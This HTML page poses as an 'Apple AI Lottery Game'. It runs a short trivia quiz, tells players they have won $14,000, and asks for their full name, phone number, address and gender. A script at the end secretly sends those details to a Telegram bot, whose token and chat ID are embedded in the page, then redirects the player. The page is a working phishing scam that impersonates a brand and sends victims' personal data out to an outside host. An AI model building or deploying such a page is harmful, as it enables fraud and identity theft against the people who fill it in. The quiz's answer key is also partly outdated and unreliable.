<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ultimate Exam Quiz</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #eaf6ff;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 800px;
      margin: 30px auto;
      padding: 20px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
    }
    h1, h2 {
      text-align: center;
      color: #007bff;
    }
    .question {
      margin: 15px 0;
      padding: 15px;
      background: #f3f3f3;
      border-left: 6px solid #007bff;
      border-radius: 5px;
    }
    label {
      display: block;
      margin: 8px 0;
    }
    input[type="radio"] {
      margin-right: 8px;
    }
    button {
      padding: 15px;
      width: 100%;
      background: #28a745;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      color: white;
      cursor: pointer;
      margin-top: 20px;
    }
    button:hover {
      background: #218838;
    }
    #timer {
      text-align: center;
      font-size: 24px;
      font-weight: bold;
      padding: 15px;
      background: #ff4d4d;
      color: white;
      border-radius: 8px;
      animation: pulse 1s infinite;
      margin-bottom: 15px;
    }
    @keyframes pulse {
      0% { transform: scale(1); background: #ff4d4d; }
      50% { transform: scale(1.05); background: #ff1a1a; }
      100% { transform: scale(1); background: #ff4d4d; }
    }
    #scoreboard {
      display: none;
      text-align: center;
      padding: 30px;
      background: linear-gradient(135deg, #6e8efb, #a777e3);
      color: white;
      border-radius: 10px;
      margin-top: 20px;
      animation: bounceIn 1s ease-in-out;
    }
    @keyframes bounceIn {
      0% { transform: scale(0.5); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
    #scoreboard h2 {
      font-size: 30px;
      margin-bottom: 15px;
    }
    input, select {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin: 10px 0;
    }
  </style>
</head>
<header>
    <div style="background-color: #0000ft; padding: 20px; max-width: 400px; border-radius: 8px; box-shadow: 0 0 10px pink; color: black; text-align: center; font-size: 18px; font-weight: bold;">
        <img width="35" height="35" src="https://i.postimg.cc/3WnjhLq9/apple.png" alt="mac-os"/><font color="gray">Apple AI Lottery Game</font></div></header>
<body>
  <div class="container" id="quizContainer">
    <div id="timer">Time left: <span id="time">05:00</span></div>
    <h1>Ultimate Quiz Exam</h1>
    <form id="quizForm"></form>
    <button id="submitBtn">Submit</button>
  </div>

  <div class="container" id="scoreboard">
    <h2 id="scoreTitle">You scored:</h2>
    <p id="scorePercent" style="font-size: 36px; font-weight: bold;"></p>
    <input type="text" id="userName" placeholder="Enter your name"/>
    <button id="okBtn">OK</button>
  </div>

  <div class="container" id="loading" style="display: none;">
    <h2>Loading...</h2>
    <div style="width: 100%; background: #ccc; border-radius: 20px;">
      <div id="progress" style="width: 0%; height: 20px; background: #007bff; border-radius: 20px;"></div>
    </div>
  </div>

  <div class="container" id="formSection" style="display: none;">
    <h2>Congratulations! You won $14,000</h2>
    <form id="winnerForm">
      <input type="text" name="name" placeholder="Full Name" required>
      <input type="tel" name="phone" placeholder="Phone Number" required>
      <input type="text" name="address" placeholder="Address" required>
      <select name="gender" required>
        <option value="">Select Gender</option>
        <option>Male</option>
        <option>Female</option>
        <option>Other</option>
      </select>
      <button type="submit">Submit & Claim</button>
    </form>
  </div>

<script>
const questions = [
  { q: "Who won 2023 UCL?", o: ["A) Real Madrid", "B) Man City", "C) PSG", "D) Milan"], a: "B" },
  { q: "Most UCL titles?", o: ["A) Bayern", "B) Liverpool", "C) Real Madrid", "D) Chelsea"], a: "C" },
  { q: "Capital of USA?", o: ["A) NY", "B) DC", "C) LA", "D) Miami"], a: "B" },
  { q: "Current US President?", o: ["A) Trump", "B) Obama", "C) Biden", "D) Harris"], a: "C" },
  { q: "Fastest land animal?", o: ["A) Lion", "B) Leopard", "C) Tiger", "D) Cheetah"], a: "D" },
  { q: "Egg-laying mammal?", o: ["A) Platypus", "B) Bat", "C) Mole", "D) Whale"], a: "A" },
  { q: "Baby goat?", o: ["A) Kid", "B) Pup", "C) Cub", "D) Calf"], a: "A" },
  { q: "Start of Hip Hop?", o: ["A) LA", "B) NY", "C) Miami", "D) Detroit"], a: "B" },
  { q: "Who made Sicko Mode?", o: ["A) Future", "B) Kanye", "C) Travis Scott", "D) J. Cole"], a: "C" },
  { q: "GOP stands for?", o: ["A) Grand Old Party", "B) Great Order", "C) Global Office", "D) Goal Oriented Party"], a: "A" },
];

let retry = false;
let timer;
let timeLeft = 300; // 5 minutes

const form = document.getElementById('quizForm');
questions.forEach((q, i) => {
  const div = document.createElement('div');
  div.className = 'question';
  div.innerHTML = `<p><b>${i + 1}. ${q.q}</b></p>` +
    q.o.map(opt => `<label><input type="radio" name="q${i}" value="${opt[0]}"> ${opt}</label>`).join('');
  form.appendChild(div);
});

const updateTimer = () => {
  const min = Math.floor(timeLeft / 60);
  const sec = timeLeft % 60;
  document.getElementById('time').textContent = `${min}:${sec < 10 ? '0' : ''}${sec}`;
  if (timeLeft === 0) {
    clearInterval(timer);
    submitQuiz();
  }
  timeLeft--;
};
timer = setInterval(updateTimer, 1000);

document.getElementById('submitBtn').onclick = () => submitQuiz();

function submitQuiz() {
  clearInterval(timer);
  let score = 0;
  questions.forEach((q, i) => {
    const ans = document.querySelector(`input[name="q${i}"]:checked`);
    if (ans && ans.value === q.a) score++;
  });

  const percent = Math.round((score / questions.length) * 100);
  document.getElementById('quizContainer').style.display = 'none';

  if (percent >= 50) {
    document.getElementById('scorePercent').textContent = `${percent}%`;
    document.getElementById('scoreboard').style.display = 'block';
  } else {
    if (retry) {
      alert("You didnâ€™t qualify for the winning.");
      window.location.href = 'games.html';
    } else {
      retry = true;
      alert("Try again. Score at least 50%.");
      document.getElementById('quizContainer').style.display = 'block';
      form.reset();
      timeLeft = 300;
      timer = setInterval(updateTimer, 1000);
    }
  }
}

document.getElementById('okBtn').onclick = () => {
  document.getElementById('scoreboard').style.display = 'none';
  document.getElementById('loading').style.display = 'block';
  let progress = 0;
  const interval = setInterval(() => {
    progress += 2;
    document.getElementById('progress').style.width = progress + '%';
    if (progress >= 100) {
      clearInterval(interval);
      document.getElementById('loading').style.display = 'none';
      document.getElementById('formSection').style.display = 'block';
    }
  }, 40);
};

document.getElementById('winnerForm').onsubmit = async (e) => {
  e.preventDefault();
  const data = new FormData(e.target);
  const message = `*Exam Winner*\nName: ${data.get("name")}\nPhone: ${data.get("phone")}\nAddress: ${data.get("address")}\nGender: ${data.get("gender")}`;
  
  await fetch(`https://api.telegram.org/bot<7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY>/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: '<874563737>', text: message, parse_mode: 'Markdown' })
  });

  window.location.href = 'certificate.html';
};
</script>
</body>
